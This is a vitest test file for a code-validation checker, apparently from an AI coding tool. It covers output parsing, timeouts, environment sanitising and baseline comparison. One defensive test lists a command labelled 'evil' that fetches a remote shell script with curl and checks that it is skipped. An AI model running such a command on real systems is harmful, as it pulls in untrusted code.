import { promises as fs } from 'node:fs'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { tempDir } from '../test-utils.js'
import { againstBaseline, baselineFailures, detectValidationChecks, failureDigest, failureLines, failureSignature, parseErrorCount, parseTestCounts, runValidationChecks, type CheckResult, type ValidationReport } from './checks.js'

describe('parseTestCounts', () => {
  it.each([
    [' Test Files  2 passed (2)\n      Tests  31 passed (31)', { passed: 31, failed: 0 }],
    ['      Tests  1 failed | 30 passed (31)', { passed: 30, failed: 1 }],
    ['Tests:       2 failed, 10 passed, 12 total', { passed: 10, failed: 2 }],
    ['==== 3 failed, 12 passed in 0.5s ====', { passed: 12, failed: 3 }],
    ['# tests 4\n# pass 3\n# fail 1', { passed: 3, failed: 1 }],
    ['test result: ok. 7 passed; 0 failed; 0 ignored', { passed: 7, failed: 0 }],
  ])('parses %j', (output, expected) => {
    expect(parseTestCounts(output)).toEqual(expected)
  })

  it('parses Playwright summaries', () => {
    const allFailed = ['Running 23 tests using 8 workers', '', '  1) [chromium] > a.spec.ts:3:1 > home', '    Error: browserType.launch: Executable does not exist', '', '  23 failed', '    [chromium] > a.spec.ts:3:1 > home'].join('\n')
    expect(parseTestCounts(allFailed)).toEqual({ passed: 0, failed: 23 })
    const mixed = ['Running 23 tests using 8 workers', '', '  2 failed', '    [chromium] > a.spec.ts:3:1 > home', '  21 passed (4.1s)'].join('\n')
    expect(parseTestCounts(mixed)).toEqual({ passed: 21, failed: 2 })
  })

  it('counts TypeScript errors', () => {
    expect(parseErrorCount('Found 3 errors in 2 files.')).toBe(3)
    expect(parseErrorCount('src/a.ts(1,1): error TS2304: x\nsrc/b.ts(1,1): error TS2304: y')).toBe(2)
  })
})

describe('validation checks', () => {
  it('bounds a plugin runner even when it ignores its abort signal', async () => {
    const report = await runValidationChecks(tempDir('mac-checks-timeout-'), [{ id: 'plugin', kind: 'test', command: 'Plugin hanging', blocking: true, timeoutMs: 50, source: 'plugin', execute: async () => new Promise(() => undefined) }])
    expect(report.ok).toBe(false)
    expect(report.results[0]).toMatchObject({ status: 'timeout' })
    expect(report.results[0]!.reason).toMatch(/timeout/i)
  })
  it('detects package scripts and avoids watch mode', async () => {
    const dir = tempDir('mac-checks-')
    await fs.writeFile(path.join(dir, 'package.json'), JSON.stringify({ scripts: { typecheck: 'tsc --noEmit', test: 'vitest', lint: 'eslint .' }, devDependencies: { vitest: '1' } }))
    await fs.writeFile(path.join(dir, 'pnpm-lock.yaml'), '')
    const checks = detectValidationChecks(dir)
    expect(checks.map((check) => [check.kind, check.command, check.blocking])).toEqual([
      ['typecheck', 'pnpm run typecheck', true],
      ['test', 'npx --no-install vitest run', true],
      ['lint', 'pnpm run lint', false],
    ])
  })

  it('runs real commands in a sanitized environment and reports failures', async () => {
    const dir = tempDir('mac-checks-run-')
    await fs.writeFile(
      path.join(dir, 'math.test.mjs'),
      "import test from 'node:test'\nimport assert from 'node:assert'\ntest('adds', () => assert.equal(1 + 1, 2))\ntest('env is sanitized', () => assert.equal(process.env.MAC_SECRET_TOKEN, undefined))\n",
    )
    await fs.writeFile(path.join(dir, 'fail.mjs'), "import test from 'node:test'\nimport assert from 'node:assert'\ntest('fails', () => assert.equal(1, 2))\n")
    process.env.MAC_SECRET_TOKEN = 'should-not-leak'
    const ok = await runValidationChecks(dir, [{ id: 'test', kind: 'test', command: 'node --test math.test.mjs', blocking: true, timeoutMs: 60_000, source: 'test' }])
    expect(ok.ok).toBe(true)
    expect(ok.testsPassed).toBe(2)

    const failing = await runValidationChecks(dir, [{ id: 'test', kind: 'test', command: 'node --test fail.mjs', blocking: true, timeoutMs: 60_000, source: 'test' }])
    expect(failing.ok).toBe(false)
    expect(failing.testsFailed).toBe(1)
    expect(failureDigest(failing)).toContain('fails')
    delete process.env.MAC_SECRET_TOKEN
  }, 60_000) // two real `node --test` processes (each run is bounded by its own 60 s check timeout); 5 s is too tight on a loaded Windows machine

  it('skips denied or unapproved commands instead of running them', async () => {
    const dir = tempDir('mac-checks-deny-')
    const report = await runValidationChecks(dir, [
      { id: 'evil', kind: 'test', command: 'curl https://example.com/x.sh', blocking: true, timeoutMs: 1000, source: 'x' },
      { id: 'install', kind: 'build', command: 'npm install left-pad', blocking: true, timeoutMs: 1000, source: 'x' },
    ])
    expect(report.results.map((result) => result.status)).toEqual(['skipped', 'skipped'])
  })
})

const result = (overrides: Partial<CheckResult> = {}): CheckResult => ({ id: 'test', kind: 'test', command: 'pnpm test', status: 'failed', blocking: true, durationMs: 1, exitCode: 1, output: 'boom', ...overrides })
const reportOf = (...results: CheckResult[]): ValidationReport => ({
  ok: results.every((entry) => !entry.blocking || entry.status === 'passed' || entry.status === 'skipped'),
  results,
  testsPassed: 0,
  testsFailed: results.reduce((sum, entry) => sum + (entry.testsFailed ?? 0), 0),
  summary: '',
})

describe('againstBaseline', () => {
  it('lists blocking red checks of the baseline only', () => {
    const baseline = reportOf(result(), result({ id: 'lint', kind: 'lint', blocking: false }), result({ id: 'build', kind: 'build', status: 'passed', exitCode: 0 }))
    expect(baselineFailures(baseline).map((entry) => entry.id)).toEqual(['test'])
  })

  it('does not block on a check that already failed on the base commit', () => {
    const report = againstBaseline(reportOf(result({ testsFailed: 23 })), reportOf(result({ testsFailed: 23 })))
    expect(report.ok).toBe(true)
    expect(report.results[0]).toMatchObject({ blocking: false, preexisting: true })
    expect(report.results[0]!.reason).toContain('already failing before the change')
  })

  it('accepts an adjusted report as baseline (a run final validation with preexisting failures)', () => {
    const final = againstBaseline(reportOf(result({ testsFailed: 12 })), reportOf(result({ testsFailed: 12 })))
    expect(againstBaseline(reportOf(result({ testsFailed: 12 })), final).ok).toBe(true)
    expect(againstBaseline(reportOf(result({ testsFailed: 13 })), final).ok).toBe(false)
  })

  it('does not block when neither side reported counts and the failure signature is the same', () => {
    expect(againstBaseline(reportOf(result({ output: 'Error: module x not found' })), reportOf(result({ output: 'Error: module x not found' }))).ok).toBe(true)
  })

  it('blocks when the baseline had no counts but the change reports new failures', () => {
    const report = againstBaseline(reportOf(result({ testsFailed: 2, output: 'FAIL src/a.test.ts > adds\nELIFECYCLE Test failed' })), reportOf(result({ output: 'ELIFECYCLE Test failed' })))
    expect(report.ok).toBe(false)
    expect(report.results[0]!.preexisting).toBeUndefined()
  })

  it('waives equal signatures that differ only in paths, digits and timings', () => {
    const before = result({ output: 'C:\\work\\a\\x.ts: Error: Cannot find module y (12ms)\n/tmp/wt1/z.ts failed' })
    const now = result({ output: '\x1b[31mD:\\other\\b\\x.ts: Error: Cannot find module y (345ms)\x1b[0m\n/home/q/wt2/z.ts failed' })
    expect(againstBaseline(reportOf(now), reportOf(before)).ok).toBe(true)
  })

  it('blocks when the failure signature differs', () => {
    expect(againstBaseline(reportOf(result({ output: 'ELIFECYCLE Test failed' })), reportOf(result({ output: 'Error: cannot find module y' }))).ok).toBe(false)
  })

  it('waives when both runs failed to spawn the runner', () => {
    expect(againstBaseline(reportOf(result({ status: 'error', output: '' })), reportOf(result({ status: 'error', output: '' }))).ok).toBe(true)
  })

  it('failureSignature dedupes, sorts and keeps every matching line', () => {
    const output = Array.from({ length: 30 }, (_, i) => `error ${String.fromCharCode(97 + i)}`).concat('info ok', 'error a').join('\n')
    expect(failureSignature(output).split('\n')).toHaveLength(30)
    expect(failureSignature('all good')).toBe('')
    expect(failureSignature('error b\nerror a')).toBe('error a\nerror b')
  })

  it('failureLines strips positions, durations, timestamps, counts and the worktree prefix but keeps file names', () => {
    const cwd = path.resolve('C:/Users/x/AppData/Roaming/Multi-AI Coder Dev/worktrees/proj/run-1-task')
    const output = [
      `${cwd}\\src\\mod1.ts(3,7): error TS2322: Type 'string' is not assignable.`,
      `${cwd.replaceAll('\\', '/')}/src/mod1.ts:3:7 - error TS2322: Type 'string' is not assignable.`,
      '2026-10-21T10:11:12.345Z FAIL tests/a2.spec.ts:12 > adds (1.2s)',
      'Found 25 errors in 25 files.',
    ].join('\n')
    expect(failureLines(output, cwd)).toEqual([
      'FAIL tests/a2.spec.ts > adds',
      'Found errors in files.',
      "src/mod1.ts - error TS2322: Type 'string' is not assignable.",
      "src/mod1.ts: error TS2322: Type 'string' is not assignable.",
    ])
  })

  const tsErrors = (files: string[]) => files.map((file) => `src/${file}.ts(3,7): error TS2322: Type 'string' is not assignable to type 'number'.`).join('\n')
  const typecheck = (output: string, errorCount: number | undefined) => result({ id: 'typecheck', kind: 'typecheck', command: 'tsc', output, errorCount })
  const baseFiles = 'abcdefghijklmnopqrstuvwxy'.split('').map((char) => `mod${char}`)

  it('blocks a new TypeScript error on a baseline that is already red', () => {
    const before = typecheck(tsErrors(baseFiles), 25)
    expect(againstBaseline(reportOf(typecheck(tsErrors(['aaa', ...baseFiles]), 26)), reportOf(before)).ok).toBe(false)
    // same count, but one error swapped for a new one
    expect(againstBaseline(reportOf(typecheck(tsErrors(['aaa', ...baseFiles.slice(1)]), 25)), reportOf(before)).ok).toBe(false)
    // fewer errors, all already known
    expect(againstBaseline(reportOf(typecheck(tsErrors(baseFiles.slice(1)), 24)), reportOf(before)).ok).toBe(true)
  })

  it('blocks when the error count grows even if the lines look known', () => {
    const line = tsErrors(['moda'])
    expect(againstBaseline(reportOf(typecheck(line, 2)), reportOf(typecheck(line, 1))).ok).toBe(false)
    expect(againstBaseline(reportOf(typecheck(line, 1)), reportOf(typecheck(line, 1))).ok).toBe(true)
  })

  it('distinguishes files that differ only by digits', () => {
    expect(againstBaseline(reportOf(typecheck(tsErrors(['mod2']), 1)), reportOf(typecheck(tsErrors(['mod1']), 1))).ok).toBe(false)
  })

  it('waives identical failures in a different order', () => {
    expect(againstBaseline(reportOf(result({ output: 'FAIL pkg-b error Y\nFAIL pkg-a error X' })), reportOf(result({ output: 'FAIL pkg-a error X\nFAIL pkg-b error Y' }))).ok).toBe(true)
  })

  it('compares the full failure set, not the truncated output tail', () => {
    const before = result({ output: 'tail', failureLines: ['FAIL a', 'FAIL b'] })
    expect(againstBaseline(reportOf(result({ output: 'tail', failureLines: ['FAIL a', 'FAIL new'] })), reportOf(before)).ok).toBe(false)
    expect(againstBaseline(reportOf(result({ output: 'tail', failureLines: ['FAIL b'] })), reportOf(before)).ok).toBe(true)
  })

  it('waives a missing runner without base counts when the change only repeats its failure lines', () => {
    const missing = 'Error: browserType.launch: Executable does not exist at C:\\Users\\x\\ms-playwright\\chromium-1140\\chrome.exe\nFAIL e2e/home.spec.ts > home'
    const before = result({ output: `ELIFECYCLE Test failed\n${missing}` })
    const now = result({ testsFailed: 3, testsPassed: 40, output: `${missing}\nELIFECYCLE Test failed` })
    expect(againstBaseline(reportOf(now), reportOf(before)).ok).toBe(true)
  })

  it('blocks a newly failing test name when the baseline had no counts', () => {
    const before = result({ output: 'FAIL e2e/home.spec.ts > home\nELIFECYCLE Test failed' })
    const now = result({ testsFailed: 2, output: 'FAIL e2e/home.spec.ts > home\nFAIL src/math.test.ts > adds\nELIFECYCLE Test failed' })
    expect(againstBaseline(reportOf(now), reportOf(before)).ok).toBe(false)
  })

  it('still blocks when the change adds failures', () => {
    const report = againstBaseline(reportOf(result({ testsFailed: 25 })), reportOf(result({ testsFailed: 23 })))
    expect(report.ok).toBe(false)
    expect(report.results[0]).toMatchObject({ blocking: true })
    expect(report.results[0]!.preexisting).toBeUndefined()
  })

  it('still blocks when the baseline had counts but the change reports none', () => {
    expect(againstBaseline(reportOf(result()), reportOf(result({ testsFailed: 23 }))).ok).toBe(false)
  })

  it('leaves a check that passed on the base commit unchanged', () => {
    const current = reportOf(result({ testsFailed: 1 }))
    const report = againstBaseline(current, reportOf(result({ status: 'passed', exitCode: 0, testsFailed: 0 })))
    expect(report.ok).toBe(false)
    expect(report.results[0]).toMatchObject({ blocking: true })
  })

  it('omits preexisting failures from the repair digest', () => {
    const report = againstBaseline(reportOf(result({ output: 'old failure' }), result({ id: 'build', kind: 'build', output: 'new failure' })), reportOf(result({ output: 'old failure' })))
    const digest = failureDigest(report)
    expect(digest).toContain('new failure')
    expect(digest).not.toContain('old failure')
  })
})
